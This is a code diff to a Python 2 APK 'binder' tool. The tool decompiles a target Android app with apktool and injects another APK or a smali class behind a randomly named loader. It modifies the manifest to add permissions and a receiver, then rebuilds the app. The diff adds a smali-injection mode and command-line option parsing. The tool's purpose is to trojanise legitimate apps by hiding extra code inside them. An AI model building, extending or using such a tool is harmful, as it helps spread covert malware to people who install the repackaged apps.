@@ -17,6 +17,7 @@ import os
 import shutil
 import sys
 import platform
+import getopt
 
 ANDROID_MANIFEST = "AndroidManifest.xml"
 REPLACE_LOADER_PACKAGE = "net/funsecurity/apk/binder/Loader"
@@ -33,25 +34,9 @@ NO_COPY = \
         os.path.join(" ", "res", "")
     ]
 
-def main():
+def apk_bind(target_apk, bind_apk, class_bind):
 
-    #Obtener sistema
-    if "windows" in platform.system().lower():
-        apktool_bin = "apktool.bat"
-        environ_delimiter = ";"
-    else:
-        apktool_bin = "apktool"
-        environ_delimiter = ":"
-
-    #Set path de apktool
-    os.environ['PATH'] = os.environ['PATH'] + environ_delimiter + os.path.abspath(os.path.join("apktool", ""))
-
-    #arg - apk objetivo
-    target_apk = sys.argv[1]
-    #arg - apk a bindear
-    bind_apk = sys.argv[2]
-    #arg - nombre de la clase a bindear
-    class_bind = sys.argv[3]
+    apktool_bin = config_apktool()
 
     #Nombre aleatorio de la clase loader
     loader_class = random_string_generator(8)
@@ -72,7 +57,7 @@ def main():
 
     if target_package == None:
         print "[x] Problems, package target incorrect"
-        return 1
+        sys.exit(1)
 
     #Parseamos paquete para obtener la ruta en el fs
     target_class_path = target_package.replace(".", "/")
@@ -120,6 +105,73 @@ def main():
     shutil.rmtree(binder_dir_smali)
 
     print "[+] Completed"
+
+def smali_bind(target_apk, smali_bind):
+
+    apktool_bin = config_apktool()
+
+    #Nombre aleatorio de la clase loader
+    loader_class = random_string_generator(8)
+
+    '''
+    APK Target
+    '''
+    print "[+] Process", target_apk, "..."
+
+    #Directorio donde almacenar el apk objetivo
+    target_dir_smali = os.path.join("tmp", str(random.randint(100000, 999999)))
+
+    #Decompilar apk objetivo
+    subprocess.call([os.path.join("apktool", apktool_bin), "d", "-f", target_apk, target_dir_smali])
+
+    #Obtenemos paquete base del apk objetivo
+    target_package = get_package_manifest(os.path.join(target_dir_smali, ANDROID_MANIFEST), target_dir_smali)
+
+    if target_package == None:
+        print "[x] Problems, package target incorrect"
+        sys.exit(1)
+
+    #Parseamos paquete para obtener la ruta en el fs
+    target_class_path = target_package.replace(".", "/")
+
+    #Obtenemos paquete y clase del fichero smali
+    path_smali_bind = get_smali_class(smali_bind)
+
+    #Cambiamos la paqueteria en Loader.smali y lo copiamos en la ruta correcta
+    prepare_loader_class(target_class_path, loader_class, target_dir_smali)
+
+    #Cambiamos la clase a bindear y lo copiamos en la ruta correcta
+    prepare_loader_properties(loader_class, target_dir_smali, path_smali_bind.replace("/", "."))
+
+    #Editamos el manifest destino estableciendo los permisos correctos y receiver
+    prepare_loader_manifest(target_dir_smali, target_package, loader_class)
+
+    #Copiamos archivo smali en el directorio destino
+    copy_smali_file(target_dir_smali, smali_bind, path_smali_bind)
+
+    '''
+    Compiling
+    '''
+    #Compilar apk bindeado
+    subprocess.call([os.path.join("apktool", apktool_bin), "b", target_dir_smali, "Bind_" + target_package + ".apk" ])
+
+    #Eliminamos directorios temporales de trabajo
+    #shutil.rmtree(target_dir_smali)
+
+    print "[+] Completed"
+
+    print "[+]", target_apk, "processed"
+
+def copy_smali_file(target_dir_smali, smali_bind, path_smali_bind):
+    os.makedirs(os.path.join(target_dir_smali, "smali", path_smali_bind[:path_smali_bind.rfind("/")]))
+    shutil.copy2(smali_bind, os.path.join(target_dir_smali, "smali", path_smali_bind) + ".smali")
+
+def get_smali_class(smali_bind):
+
+    fi = open(smali_bind, "rt")
+    smali_file = fi.read(os.path.getsize(smali_bind))
+    fi.close()
+    return smali_file[smali_file.find("L")+1:smali_file.find(";")]
 
 def merge_manifest(source_manifest, target_manifest, binder_dir_smali):
 
@@ -305,13 +357,70 @@ def random_string_generator(size=6):
     chars = "abcdefghijklmnopqrstuvwxyz"
     return "".join(random.choice(chars) for x in range(size))
 
+def config_apktool():
+
+    #Obtener sistema
+    if "windows" in platform.system().lower():
+        apktool_bin = "apktool.bat"
+        environ_delimiter = ";"
+    else:
+        apktool_bin = "apktool"
+        environ_delimiter = ":"
+
+    #Set path de apktool
+    os.environ['PATH'] = os.environ['PATH'] + environ_delimiter + os.path.abspath(os.path.join("apktool", ""))
+
+    return apktool_bin
+
+def get_params():
+
+    target_apk = None
+    smali_bind_file = None
+    bind_apk = None
+    class_bind = None
+
+    try:
+        opts, args = getopt.getopt(sys.argv[1:], "t:b:c:s:")
+        for opt, arg in opts:
+            if opt == "-t":
+                target_apk = arg
+            elif opt == "-b":
+                bind_apk = arg
+            elif opt == "-c":
+                class_bind = arg
+            elif opt == "-s":
+                smali_bind_file = arg
+
+        if target_apk is None:
+            print "[x] -t param apk target required"
+        elif smali_bind_file != None:
+            print "[+] smali bind mode"
+            smali_bind(target_apk, smali_bind_file)
+        elif bind_apk is None:
+            print "[x] insufficient parameters, specify [-b -c] or -s"
+        elif class_bind is None:
+            print class_bind
+            print "[x] insufficient parameters, specify [-b -c] or -s"
+        else:
+            print "[+] apk bind mode"
+            apk_bind(target_apk, bind_apk, class_bind)
+    except getopt.GetoptError:
+        usage()
+
 def usage():
 
-    print "Usage:",  sys.argv[0], "<apk_target> <apk_binder> <invoke.class>"
-    print "-----------------------------------------------------------------"
-    print "apk_target       #apk target"
-    print "apk_binder       #apk bind on target"
-    print "invoke.class     #class (preferably a service) to invoke when the event is revealed (in loader/receiver.xml)"
+    print "Usage:",  sys.argv[0], "[OPTIONS]\n"
+    print "---------------------------------------------------"
+    print " -t      apk target"
+    print " -b      apk bind on target"
+    print " -c      class to invoke when the event is revealed"
+    print " -s      class smali to bind"
+    print "---------------------------------------------------\n"
+    print "Examples:\n"
+    print "# smali bind to apk\n"
+    print sys.argv[0], "-t apk_target.apk -s service_bind.smali\n"
+    print "# apk bind to another apk\n"
+    print sys.argv[0], "-t apk_target.apk -b apk_bind.apk -c class.service.to.invoke.from.bind\n"
 
 def version():
     print ""
@@ -325,7 +434,7 @@ def init():
     if len(sys.argv) < 4:
         usage()
     else:
-        main()
+        get_params()
 
 if __name__ == "__main__":
 	init()
